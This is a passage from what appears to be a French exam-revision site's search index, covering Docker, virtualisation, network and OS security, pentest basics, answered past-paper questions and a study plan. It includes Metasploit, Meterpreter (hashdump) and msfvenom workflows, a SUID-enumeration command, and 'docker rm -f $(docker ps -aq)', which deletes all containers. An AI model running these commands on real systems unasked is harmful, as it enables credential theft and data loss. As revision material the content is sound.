  "text": "11 Docker Compose Validé Docker Compose décrit une application multi-conteneurs dans un fichier docker-compose.yml . Il crée un réseau commun, démarre les services dans l'ordre des dépendances et facilite le développement. version: \"3.8\" services: db: image: mysql:8 environment: MYSQL_ROOT_PASSWORD: example MYSQL_DATABASE: wordpress volumes: - db_data:/var/lib/mysql wordpress: image: wordpress:latest depends_on: - db ports: - \"8088:80\" environment: WORDPRESS_DB_HOST: db WORDPRESS_DB_PASSWORD: example volumes: db_data: Clé Rôle services Liste des conteneurs. image / build Image à utiliser ou Dockerfile à construire. ports Mapping hôte:conteneur. environment Variables d'environnement. volumes Persistance des données. depends_on Ordre de démarrage (pas de healthcheck implicite). networks Réseaux partagés. restart Politique de redémarrage. Commandes : docker compose up -d (démarre en arrière"
 },
 {
  "page": "vs.html",
  "url": "vs.html#orchestration",
  "subject": "Virtualisation & Stockage",
  "title": "Orchestration & sécurité",
  "text": "12 Orchestration & sécurité Validé Orchestration À grande échelle, il faut gérer le placement, le scaling, la disponibilité, le réseau et les mises à jour des conteneurs. Outil Rôle Kubernetes Standard de facto : pods, services, deployments, scaling, self-healing. Docker Swarm Orchestration native Docker, plus simple. Nomad Orchestrateur HashiCorp, multi-workloads. Portainer Interface de gestion Docker/Kubernetes. OpenShift Plateforme Kubernetes d'entreprise (Red Hat). Sécurité des conteneurs Image de base minimale, à jour, scannée (Trivy, Clair). Utilisateur non-root, read-only filesystem, pas de --privileged . Secrets gérés (Docker secrets, Vault), pas dans l'image. Limites de ressources (cgroups), network policies. Isolation : ne pas partager le socket Docker, namespaces utilisateur. Noyau de l'hôte à jour : une faille noyau affecte tous les conteneurs. Registry privé, signature d'ima"
 },
 {
  "page": "vs.html",
  "url": "vs.html#tp",
  "subject": "Virtualisation & Stockage",
  "title": "Questions de TP",
  "text": "13 Questions de TP Validé Créer une VM sur ESXi 1) Uploader l'ISO sur un datastore. 2) Créer une VM : nom, guest OS, CPU/RAM, disque, réseau. 3) Monter l'ISO, démarrer, installer l'OS. 4) Installer VMware Tools. 5) Vérifier réseau, stockage, snapshots. Créer un commutateur virtuel Networking → Virtual switches → Add. Choisir les uplinks (NIC physiques), le MTU, les ports. Créer un port group, définir le VLAN et les politiques de sécurité. Vérifier la connectivité avec vmkping . Déployer une VM depuis un OVF File → Deploy OVF Template, choisir l'URL ou le fichier, nommer, sélectionner le datastore, le réseau, les options de disque (thin/thick), puis power on. Vérifier les VMware Tools et la configuration réseau. Intérêt d'un snapshot + exemple Point d'état temporaire avant une mise à jour ou un test. Exemple : snapshot avant un patch critique ; si l'application ne démarre plus, revert. Ce"
 },
 {
  "page": "vs.html",
  "url": "vs.html#annales",
  "subject": "Virtualisation & Stockage",
  "title": "Annales & QCM corrigés",
  "text": "14 Annales & QCM corrigés Validé RAT 2025 — QCM # Question Réponse 1 Hyperviseur type 1 bare metal VMware B. ESXi 2 Éditeurs de solutions de virtualisation A, B, C, D (VMware, Oracle, Microsoft, Proxmox) 3 Virtualisation B. Représentation virtuelle d'un système matériel 4 Applications de la virtualisation A, B, C, D (serveur, réseau, stockage, applications) 5 Intérêts de la virtualisation B, C (économie matériel, isolation réseau) ; A discutable (coût initial) 6 L'hyperviseur est une couche de virtualisation A. Vrai 7 Type 2 natif ? B. Non 8 Virtualisation d'OS C. Les deux (serveur et poste de travail) 9 Forme principale de virtualisation de poste B. VDI 10 Pourquoi moins de coûts A, B (moins d'espace/équipements, moins d'énergie) ; pas C 11 Type 2 installé sur un OS existant A. Vrai 12 Principes de la virtualisation A, C, D (partitionnement, isolation, indépendance) 13 Inventeur dans le"
 },
 {
  "page": "vs.html",
  "url": "vs.html#quiz",
  "subject": "Virtualisation & Stockage",
  "title": "Quiz express",
  "text": "? Quiz express 10 questions tirées au hasard. Objectif : 8/10."
 },
 {
  "page": "vs.html",
  "url": "vs.html#flashcards",
  "subject": "Virtualisation & Stockage",
  "title": "Flashcards",
  "text": "⚡ Flashcards Lancer les flashcards → Espace = retourner · ← → = naviguer"
 },
 {
  "page": "last-minute.html",
  "url": "last-minute.html",
  "subject": "Dernière minute",
  "title": "Ethical Hacking",
  "text": "5 phases : recon → scan/énumération → accès → persistance → effacement des traces (+ rapport). Passif = pas d'interaction (OSINT, WHOIS, Shodan, Google Dorks). Actif = Nmap, scan, connexion. Nmap : -sV version, -O OS, -sS SYN, -p- tous les ports, --script NSE. NSE : scripts Lua, catégories safe/auth/vuln/exploit, détection de CVE. Metasploit : search , use , set RHOSTS , set LHOST , run , sessions -i . Meterpreter : shell en mémoire, hashdump , migrate , getuid . msfvenom : -p , LHOST , LPORT , -f , -o . Reverse shell = cible → attaquant ; traverse mieux les NAT. Brute force = toutes les combinaisons ; dictionnaire = liste de mots. Défenses : MFA, hash bcrypt/Argon2, verrouillage, rate limiting, Fail2ban, logs 4625. OWASP : A01 accès, A03 injection, A07 auth, A10 SSRF. Rapport : synthèse, méthode, constats + CVSS, remédiation, annexes. Si tu ne retiens qu'une chose : les 5 phases et les "
 },
 {
  "page": "last-minute.html",
  "url": "last-minute.html",
  "subject": "Dernière minute",
  "title": "Sécurité Réseaux",
  "text": "DICP : disponibilité, intégrité, confidentialité, preuve. DMZ : zone tampon entre Internet et LAN, défense en profondeur, services exposés. Deux FW : double filtrage ; même marque = homogénéité ; marques différentes = diversité. Règles : par zone, source/destination/port explicites, premier match, deny all + log. Stateful : table de connexions, autorise established/related ; stateless : chaque paquet seul. Proxy : rupture protocolaire, cache, filtrage, anonymisation. Reverse proxy : protection, load balancing, TLS. IPsec : AH = intégrité sans chiffrement ; ESP = confidentialité + intégrité ; tunnel = VPN. SPD = politique ; SAD = SA actives ; NAT-T = UDP 4500. WEP = RC4 + IV 24 bits + CRC-32 → cassé. WPA2-Enterprise = 802.1X + RADIUS. PEAP vs TTLS : TTLS ouvert/flexible ; PEAP très Windows ; certificat serveur obligatoire. IDS alerte (passif) ; IPS bloque (inline). Placement : entre FW1 e"
 },
 {
  "page": "last-minute.html",
  "url": "last-minute.html",
  "subject": "Dernière minute",
  "title": "Sécurité des OS",
  "text": "4 principes : minimisation, moindre privilège, défense en profondeur, veille/maintenance. umask 0027 → fichier 640, répertoire 750. Fichier par défaut 666, répertoire 777. SUID = EUID du propriétaire ; find / -perm -4000 -type f . Sticky = /tmp. SUID root : risque d'escalade ; surfaces = entrées, environnement, TOCTOU, shell. Réduire, auditer, capabilities. Sudo : use_pty, requiretty, noexec, umask 0027, ignore_dot, env_reset. Wildcards = dangereux. PAM = auth centralisée + politique mdp. SELinux/AppArmor = MAC + cloisonnement. Sysctl : ASLR=2, kptr_restrict, dmesg_restrict, suid_dumpable=0, syncookies=1, rp_filter=1. Buffer overflow : ASLR, NX/DEP, canary, PIE, RELRO ; Windows /GS, CFG, SafeSEH. Windows : Winlogon = session ; LSASS = auth/token/secrets ; SRM = accès/audit. UAC = token filtré + élévation ; MIC = niveaux Low/Medium/High/System. Credential Guard = VBS ; LSA Protection = PP"
 },
 {
  "page": "last-minute.html",
  "url": "last-minute.html",
  "subject": "Dernière minute",
  "title": "Sécurité des SI",
  "text": "DICP + preuve. RGPD : finalité, minimisation, durée, exactitude, intégrité/confidentialité, responsabilité. Données de santé = sensibles ; AIPD ; CNIL 72 h ; droits des personnes. Risque = V × I ; traitements : réduire, accepter, éviter, transférer. ISO 27001 = SMSI ; 27002 = contrôles ; 27005 = risques ; 22301 = continuité. EBIOS RM = 5 ateliers (cadrage, sources, scénarios stratégiques, opérationnels, traitement). IAM : identifier, authentifier, autoriser, tracer ; RBAC, moindre privilège, revue des accès, MFA. LDAP : DN/OU/CN, bind, LDAPS 636, pas d'anonymous bind. PCA = activité en mode dégradé ; PRA = restauration du SI ; RTO/RPO . Sauvegarde 3-2-1 + test de restauration + copie offline/immuable. Cas : actifs → données/RGPD → menaces → vulnérabilités → impacts → risques → recommandations. Phrase : « mesure X → principe Y → risque Z réduit ». Si tu ne retiens qu'une chose : la grille"
 },
 {
  "page": "last-minute.html",
  "url": "last-minute.html",
  "subject": "Dernière minute",
  "title": "Virtualisation & Stockage",
  "text": "Type 1 = bare metal (ESXi, Hyper-V, Proxmox, Xen, KVM) ; type 2 = hébergé (VirtualBox, Workstation). Conteneur = noyau partagé, léger, isolation plus faible ; VM = OS complet, isolation forte. vSwitch = switch virtuel ; VMkernel = réseau infra (vMotion, iSCSI, NFS). 3 réseaux VMware : bridged, NAT, host-only. Stockage : DAS bloc local, NAS fichier, SAN bloc dédié ; vSAN hyperconvergé. VMFS = bloc VMware ; NFS = fichier ; VMDK = disque virtuel. vMotion = CPU/RAM ; Storage vMotion = disque ; snapshot ≠ backup . HA = redémarre ; DRS = équilibre ; FT = zéro downtime. Docker : image (read-only), conteneur (writable), registry (Docker Hub). Dockerfile : FROM obligatoire ; RUN, COPY, WORKDIR, EXPOSE, ENV, CMD. Compose : services, image/build, ports, volumes, depends_on ; docker compose up -d . Supprimer tous les conteneurs : docker rm -f $(docker ps -aq) . Si tu ne retiens qu'une chose : les 3 "
 },
 {
  "page": "last-minute.html",
  "url": "last-minute.html",
  "subject": "Dernière minute",
  "title": "Le matin de l'examen",
  "text": "Relis uniquement cette page, pas les fiches complètes. Prépare ta convocation, carte d'identité, stylos, montre (sans montre connectée). Arrive en avance, coupe le téléphone, range-le. Lis tout le sujet avant de commencer : repère les questions faciles. Commence par ce que tu maîtrises, garde 10 minutes de relecture. QCM : réponds à tout, aucune case vide. Questions ouvertes : structure en titres, mots-clés, exemples. Si tu bloques : écris la définition, puis un exemple, puis une mesure. Ça débloque. Ne réécris pas le cours : réponds à la question posée. Garde ton calme : une question ratée ne coule pas l'examen. Rappel : la note se gagne d'abord sur les questions faciles et les définitions. Ne commence pas par la question à 5 points qui te bloque."
 },
 {
  "page": "plan.html",
  "url": "plan.html",
  "subject": "Plan de révision",
  "title": "Fondations : SI + Virtualisation",
  "text": "J-5 Fondations : SI + Virtualisation Les deux matières les plus rentables. On installe le vocabulaire et les réflexes de copie. SI — Lire « Cas pratique : le cabinet médical » et la méthode d'audit 60 min · Fiche SI, sections 1 à 3 + cas corrigé SI — RGPD, analyse de risques, ISO 27001/27005 60 min · Apprendre les définitions et les 4 traitements du risque VS — Hyperviseurs, types de virtualisation, stockage 60 min · Schémas type 1 / type 2 / conteneur à refaire au brouillon Quiz SI + VS, puis réciter 10 définitions 30 min · Objectif : 7/10 minimum avant de passer à la suite"
 },
 {
  "page": "plan.html",
  "url": "plan.html",
  "subject": "Plan de révision",
  "title": "Réseaux : architecture, DMZ, firewall",
  "text": "J-4 Réseaux : architecture, DMZ, firewall La journée la plus « exam » : savoir lire un schéma et écrire des règles de filtrage. Réseaux — DMZ, segmentation, deux firewalls, proxies 75 min · Fiche Réseaux, sections 1 à 4 Réseaux — Refaire l'exercice firewall des annales 60 min · Écrire le tableau FW2 sans regarder le corrigé Réseaux — IPsec, VPN, Wi-Fi, DDoS 60 min · Tableaux de comparaison + NAT-T Quiz Réseaux + réciter les 7 principes firewall 30 min · Objectif : 8/10"
 },
 {
  "page": "plan.html",
  "url": "plan.html",
  "subject": "Plan de révision",
  "title": "OS : Linux puis Windows",
  "text": "J-3 OS : Linux puis Windows Deux blocs distincts. Ne mélange pas : le correcteur attend des mécanismes précis. OS — Permissions, umask, SUID/SGID, sudo, PAM 75 min · Savoir calculer et expliquer chaque risque OS — Durcissement Linux, sysctl, journalisation, patch management 50 min · Apprendre 6 paramètres sysctl + leur attaque évitée OS — Windows : architecture, LSASS, UAC, Credential Guard 75 min · Fiche OS, sections Windows Quiz OS + expliquer LSASS à voix haute 30 min · Objectif : 7/10"
 },
 {
  "page": "plan.html",
  "url": "plan.html",
  "subject": "Plan de révision",
  "title": "Hacking : méthodes et outils",
  "text": "J-2 Hacking : méthodes et outils Le QCM se joue sur les définitions et les commandes. Les questions ouvertes se jouent sur la structure. EH — Phases du pentest, reconnaissance passive/active, OSINT 60 min · Tableau des outils + Nmap EH — Metasploit, msfvenom, brute force et défenses 60 min · Workflow exact + commandes EH — Rédiger 2 questions ouvertes d'annales 40 min · Footprinting + 5 phases du projet Réseaux — Relire Wi-Fi + IPsec (30 min), puis quiz EH 40 min · Les deux sujets qui reviennent chaque année"
 },
 {
  "page": "plan.html",
  "url": "plan.html",
  "subject": "Plan de révision",
  "title": "Restitution, pas découverte",
  "text": "J-1 Restitution, pas découverte Aucune nouvelle notion. On consolide, on simule, on dort. Lire les 5 fiches « dernière minute » 30 min · Une matière à la fois, à voix haute Faire les 5 quiz en mode examen 60 min · Sans fiche, sans pause, noter les erreurs Refaire 2 questions ouvertes par matière au brouillon 60 min · Plan en 3 lignes + mots-clés, pas de rédaction complète Relire uniquement les pièges et les tableaux de comparaison 30 min · Puis écran off, 7 h de sommeil"
 }
];
